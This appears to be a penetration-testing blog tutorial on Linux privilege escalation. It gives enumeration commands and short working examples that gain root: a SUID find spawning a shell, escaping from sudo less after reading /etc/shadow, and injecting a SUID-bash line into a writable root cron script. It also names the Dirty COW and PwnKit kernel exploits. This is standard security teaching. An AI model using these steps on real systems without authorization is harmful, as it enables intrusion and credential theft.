---
title: Linux Privilege Escalation Basics
date: 2026-04-10
readtime: 15
description: Common misconfigurations and kernel exploits used to escalate from low-priv to root on Linux.
tags: linux, privilege-escalation, pentesting
---

$ cat linux-privesc-basics.md

### Introduction

You've popped a shell on a Linux box, but you're logged in as `www-data` or a low-privileged user. The goal now is to get `root`. Privilege escalation on Linux usually boils down to finding misconfigurations, weak permissions, or outdated software. 

### 1. Enumerate First

Enumeration is the key to privilege escalation. You need to gather as much information about the system as possible before firing off exploits.

Run these commands to understand the target environment:

```bash
# System Information
uname -a
cat /etc/os-release
hostname

# User & Group Info
id
cat /etc/passwd
sudo -l

# Network Information
ss -tuln
arp -a
ip a

# Search for interesting files
find / -perm -4000 -type f 2>/dev/null  # Find SUID binaries
find / -writable -type d 2>/dev/null    # Find writable directories
cat /etc/crontab                        # Look at scheduled tasks
```

### 2. Common Escalation Vectors

#### SUID Binaries
SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. When a binary with the SUID bit set is executed, it runs with the privileges of the file owner (often root).

If an administrator misconfigures a common binary (like `vim`, `find`, or `nmap`) by setting the SUID bit, you can exploit it to spawn a root shell.

**Example using `find`:**
If `find` has the SUID bit set:
```bash
find . -exec /bin/sh -p \; -quit
```
*(Always check [GTFOBins](https://gtfobins.github.io/) for exploitable commands!)*

#### Sudo Misconfigurations
Sometimes, administrators allow users to run specific commands as root without a password via the `/etc/sudoers` file. You can check this by running `sudo -l`.

**Example:**
If `sudo -l` shows you can run `/usr/bin/less` without a password:
```bash
sudo less /etc/shadow
# Inside less, type:
!/bin/sh
```
This drops you into a root shell!

#### Cron Jobs
Cron jobs are scheduled tasks. If root is executing a script periodically, and that script is writable by your low-privileged user, you can inject malicious code into it.

**Example:**
If `/opt/cleanup.sh` is running as root every 5 minutes and is world-writable:
```bash
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /opt/cleanup.sh
# Wait 5 minutes...
/tmp/rootbash -p
```

#### Kernel Exploits
If the machine is running an outdated kernel (e.g., Linux 2.6 or 3.x), it might be vulnerable to well-known exploits like *Dirty COW* (CVE-2016-5195) or *PwnKit* (CVE-2021-4034). 
*Warning: Kernel exploits can crash the system. Use them as a last resort in production environments.*

### Automation Tools

Manual enumeration takes time. Use these scripts to speed up the process:

- **LinPEAS** — The gold standard for Linux enumeration. It highlights potential paths in red/yellow.
- **Linux Exploit Suggester** — Checks the kernel version against a database of known exploits.
- **Pspy** — Monitors processes without needing root permissions. Great for finding hidden cron jobs.

Remember: Enumeration is a loop. If you find new credentials or access a new user, start the enumeration process over from the beginning!
